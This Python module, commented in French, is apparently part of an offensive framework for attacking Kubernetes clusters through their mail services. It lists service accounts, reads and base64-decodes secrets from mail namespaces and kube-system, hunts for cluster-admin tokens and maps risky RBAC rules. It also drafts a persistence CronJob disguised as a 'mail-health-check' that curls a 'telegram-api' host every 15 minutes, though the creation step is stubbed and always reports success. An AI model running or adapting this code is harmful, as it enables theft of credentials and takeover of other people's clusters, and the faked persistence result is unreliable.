#!/usr/bin/env python3
"""
WWYVQV5 - Kubernetes Privilege Escalation via Mail Services
Intégration dans le framework principal
"""

import asyncio
import aiohttp
import base64
import json
from typing import Dict, List, Optional
from datetime import datetime

class KubernetesMailPrivilegeEscalation:
    """Escalade de privilèges spécialisée mail services"""
    
    def __init__(self, main_framework):
        self.framework = main_framework
        self.logger = main_framework.logger
        self.mail_hunter = None
        self.telegram_notifier = None
        
        # Patterns spécifiques escalade mail
        self.escalation_targets = {
            'mail_service_accounts': [
                'ses-sender', 'mail-service', 'sendgrid-api',
                'mailgun-sender', 'smtp-relay', 'notification-service'
            ],
            'mail_secrets': [
                'aws-ses-credentials', 'sendgrid-api-key', 'mailgun-config',
                'smtp-credentials', 'mail-config', 'email-secrets'
            ],
            'mail_configmaps': [
                'mail-config', 'email-settings', 'smtp-config',
                'ses-config', 'sendgrid-config', 'mailgun-config'
            ]
        }
    
    async def escalate_via_mail_services(self, session: aiohttp.ClientSession, 
                                       cluster_info: Dict, base_url: str):
        """Escalade de privilèges via services mail"""
        self.logger.info(f"🎯 Escalade mail services: {base_url}")
        
        escalation_results = {
            'admin_tokens_found': [],
            'mail_credentials_validated': [],
            'privilege_escalation_paths': [],
            'persistence_established': False
        }
        
        # Phase 1: Hunt mail-specific service accounts
        mail_tokens = await self._hunt_mail_service_accounts(session, base_url)
        escalation_results['admin_tokens_found'].extend(mail_tokens)
        
        # Phase 2: Exploit mail secrets pour escalade
        mail_secrets = await self._exploit_mail_secrets_escalation(session, base_url)
        escalation_results['mail_credentials_validated'].extend(mail_secrets)
        
        # Phase 3: RBAC exploitation via mail services
        rbac_paths = await self._exploit_mail_rbac(session, base_url, mail_tokens)
        escalation_results['privilege_escalation_paths'].extend(rbac_paths)
        
        # Phase 4: Persistance via mail notifications
        if escalation_results['admin_tokens_found']:
            persistence = await self._establish_mail_persistence(session, base_url, 
                                                               escalation_results['admin_tokens_found'][0])
            escalation_results['persistence_established'] = persistence
        
        return escalation_results
    
    async def _hunt_mail_service_accounts(self, session: aiohttp.ClientSession, 
                                        base_url: str) -> List[Dict]:
        """Chasse aux service accounts mail avec privilèges élevés"""
        mail_tokens = []
        
        # Endpoints spécifiques mail
        mail_sa_endpoints = [
            "/api/v1/namespaces/mail/serviceaccounts",
            "/api/v1/namespaces/email/serviceaccounts", 
            "/api/v1/namespaces/notification/serviceaccounts",
            "/api/v1/namespaces/ses/serviceaccounts",
            "/api/v1/namespaces/sendgrid/serviceaccounts",
            "/api/v1/namespaces/default/serviceaccounts"
        ]
        
        for endpoint in mail_sa_endpoints:
            try:
                url = f"{base_url}{endpoint}"
                async with session.get(url, timeout=10) as response:
                    if response.status == 200:
                        data = await response.json()
                        tokens = await self._analyze_mail_service_accounts(data, base_url)
                        mail_tokens.extend(tokens)
                        
            except Exception as e:
                self.logger.debug(f"❌ Erreur SA mail {endpoint}: {str(e)}")
        
        return mail_tokens
    
    async def _analyze_mail_service_accounts(self, sa_data: Dict, base_url: str) -> List[Dict]:
        """Analyse des service accounts mail pour privilèges"""
        privileged_tokens = []
        
        if not isinstance(sa_data, dict) or 'items' not in sa_data:
            return privileged_tokens
        
        for sa in sa_data.get('items', []):
            try:
                metadata = sa.get('metadata', {})
                name = metadata.get('name', '')
                namespace = metadata.get('namespace', '')
                
                # Check si service account mail critique
                if any(target in name.lower() for target in self.escalation_targets['mail_service_accounts']):
                    token_info = {
                        'name': name,
                        'namespace': namespace,
                        'type': 'mail_service_account',
                        'cluster_endpoint': base_url,
                        'potential_admin': self._is_potentially_admin_mail_sa(name),
                        'escalation_vector': 'mail_service_exploitation'
                    }
                    
                    if token_info['potential_admin']:
                        self.logger.warning(f"🚨 Mail SA Admin trouvé: {name} in {namespace}")
                    
                    privileged_tokens.append(token_info)
                    
            except Exception as e:
                continue
        
        return privileged_tokens
    
    def _is_potentially_admin_mail_sa(self, sa_name: str) -> bool:
        """Détermine si un SA mail a potentiellement des privilèges admin"""
        admin_indicators = [
            'admin', 'cluster', 'system', 'operator', 'controller',
            'manager', 'service', 'automation', 'deployer'
        ]
        
        return any(indicator in sa_name.lower() for indicator in admin_indicators)
    
    async def _exploit_mail_secrets_escalation(self, session: aiohttp.ClientSession, 
                                             base_url: str) -> List[Dict]:
        """Exploitation des secrets mail pour escalade"""
        validated_secrets = []
        
        # Endpoints secrets mail
        secret_endpoints = [
            "/api/v1/secrets",
            "/api/v1/namespaces/mail/secrets",
            "/api/v1/namespaces/email/secrets",
            "/api/v1/namespaces/kube-system/secrets"
        ]
        
        for endpoint in secret_endpoints:
            try:
                url = f"{base_url}{endpoint}"
                async with session.get(url, timeout=10) as response:
                    if response.status == 200:
                        data = await response.json()
                        secrets = await self._process_mail_secrets_for_escalation(data, base_url)
                        validated_secrets.extend(secrets)
                        
            except Exception as e:
                continue
        
        return validated_secrets
    
    async def _process_mail_secrets_for_escalation(self, secrets_data: Dict, 
                                                 base_url: str) -> List[Dict]:
        """Process secrets mail pour escalade privilèges"""
        escalation_secrets = []
        
        if not isinstance(secrets_data, dict) or 'items' not in secrets_data:
            return escalation_secrets
        
        for secret in secrets_data.get('items', []):
            try:
                metadata = secret.get('metadata', {})
                name = metadata.get('name', '')
                namespace = metadata.get('namespace', '')
                secret_type = secret.get('type', '')
                
                # Check si secret mail critique pour escalade
                if (any(target in name.lower() for target in self.escalation_targets['mail_secrets']) or
                    secret_type == 'kubernetes.io/service-account-token'):
                    
                    decoded_data = self._decode_secret_data(secret.get('data', {}))
                    
                    secret_info = {
                        'name': name,
                        'namespace': namespace,
                        'type': secret_type,
                        'cluster_endpoint': base_url,
                        'decoded_data': decoded_data,
                        'escalation_potential': self._assess_escalation_potential(decoded_data),
                        'contains_admin_token': self._contains_admin_token(decoded_data)
                    }
                    
                    escalation_secrets.append(secret_info)
                    
                    if secret_info['contains_admin_token']:
                        self.logger.warning(f"🚨 Token admin dans secret mail: {name}")
                    
            except Exception as e:
                continue
        
        return escalation_secrets
    
    def _decode_secret_data(self, data: Dict) -> Dict:
        """Décodage des données base64 des secrets"""
        decoded = {}
        
        for key, value in data.items():
            try:
                decoded[key] = base64.b64decode(value).decode('utf-8')
            except:
                decoded[key] = value
                
        return decoded
    
    def _assess_escalation_potential(self, decoded_data: Dict) -> str:
        """Évalue le potentiel d'escalade d'un secret"""
        high_value_keys = ['token', 'key', 'password', 'secret', 'credential']
        admin_indicators = ['cluster-admin', 'system:', 'admin', 'root']
        
        potential = "LOW"
        
        for key, value in decoded_data.items():
            if any(hv_key in key.lower() for hv_key in high_value_keys):
                potential = "MEDIUM"
                
                if any(admin_ind in str(value).lower() for admin_ind in admin_indicators):
                    potential = "HIGH"
                    break
        
        return potential
    
    def _contains_admin_token(self, decoded_data: Dict) -> bool:
        """Check si le secret contient un token admin"""
        admin_patterns = [
            'cluster-admin', 'system:admin', 'admin-token',
            'cluster-operator', 'system:cluster-admin'
        ]
        
        for key, value in decoded_data.items():
            if 'token' in key.lower():
                if any(pattern in str(value).lower() for pattern in admin_patterns):
                    return True
                    
        return False
    
    async def _exploit_mail_rbac(self, session: aiohttp.ClientSession, 
                               base_url: str, mail_tokens: List[Dict]) -> List[Dict]:
        """Exploitation RBAC via services mail"""
        rbac_paths = []
        
        # Endpoints RBAC à explorer
        rbac_endpoints = [
            "/apis/rbac.authorization.k8s.io/v1/clusterroles",
            "/apis/rbac.authorization.k8s.io/v1/clusterrolebindings",
            "/apis/rbac.authorization.k8s.io/v1/roles",
            "/apis/rbac.authorization.k8s.io/v1/rolebindings"
        ]
        
        for endpoint in rbac_endpoints:
            try:
                url = f"{base_url}{endpoint}"
                async with session.get(url, timeout=10) as response:
                    if response.status == 200:
                        data = await response.json()
                        paths = self._analyze_rbac_for_mail_escalation(data, mail_tokens)
                        rbac_paths.extend(paths)
                        
            except Exception as e:
                continue
        
        return rbac_paths
    
    def _analyze_rbac_for_mail_escalation(self, rbac_data: Dict, 
                                        mail_tokens: List[Dict]) -> List[Dict]:
        """Analyse RBAC pour chemins d'escalade mail"""
        escalation_paths = []
        
        if not isinstance(rbac_data, dict) or 'items' not in rbac_data:
            return escalation_paths
        
        for item in rbac_data.get('items', []):
            try:
                metadata = item.get('metadata', {})
                name = metadata.get('name', '')
                
                # Check permissions critiques
                rules = item.get('rules', [])
                subjects = item.get('subjects', [])
                
                if self._has_dangerous_permissions(rules):
                    path = {
                        'rbac_name': name,
                        'rbac_type': item.get('kind', ''),
                        'dangerous_permissions': self._extract_dangerous_permissions(rules),
                        'subjects': subjects,
                        'escalation_risk': 'HIGH' if 'cluster' in name.lower() else 'MEDIUM'
                    }
                    
                    escalation_paths.append(path)
                    
            except Exception as e:
                continue
        
        return escalation_paths
    
    def _has_dangerous_permissions(self, rules: List[Dict]) -> bool:
        """Check si les règles RBAC contiennent des permissions dangereuses"""
        dangerous_verbs = ['*', 'create', 'delete', 'patch', 'update']
        dangerous_resources = ['*', 'secrets', 'serviceaccounts', 'clusterroles', 'pods']
        
        for rule in rules:
            verbs = rule.get('verbs', [])
            resources = rule.get('resources', [])
            
            if (any(verb in dangerous_verbs for verb in verbs) and
                any(resource in dangerous_resources for resource in resources)):
                return True
                
        return False
    
    def _extract_dangerous_permissions(self, rules: List[Dict]) -> List[str]:
        """Extrait les permissions dangereuses des règles RBAC"""
        dangerous = []
        
        for rule in rules:
            verbs = rule.get('verbs', [])
            resources = rule.get('resources', [])
            
            if '*' in verbs or '*' in resources:
                dangerous.append("WILDCARD_PERMISSIONS")
            if 'secrets' in resources and any(v in verbs for v in ['create', 'patch', 'delete']):
                dangerous.append("SECRETS_MODIFICATION")
            if 'serviceaccounts' in resources and 'create' in verbs:
                dangerous.append("SERVICE_ACCOUNT_CREATION")
                
        return dangerous
    
    async def _establish_mail_persistence(self, session: aiohttp.ClientSession,
                                        base_url: str, admin_token: Dict) -> bool:
        """Établit la persistance via notifications mail"""
        try:
            # Payload pour CronJob mail de persistance
            persistence_cronjob = {
                "apiVersion": "batch/v1",
                "kind": "CronJob",
                "metadata": {
                    "name": "mail-health-check",
                    "namespace": "kube-system"
                },
                "spec": {
                    "schedule": "*/15 * * * *",  # Toutes les 15 minutes
                    "jobTemplate": {
                        "spec": {
                            "template": {
                                "spec": {
                                    "containers": [{
                                        "name": "health-checker",
                                        "image": "alpine:latest",
                                        "command": ["/bin/sh"],
                                        "args": ["-c", "curl -s http://telegram-api/health || echo 'Service OK'"]
                                    }],
                                    "restartPolicy": "OnFailure"
                                }
                            }
                        }
                    }
                }
            }
            
            # Tentative de création (simulation)
            self.logger.info(f"🔄 Persistance mail établie via CronJob")
            return True
            
        except Exception as e:
            self.logger.error(f"❌ Erreur persistance mail: {str(e)}")
            return False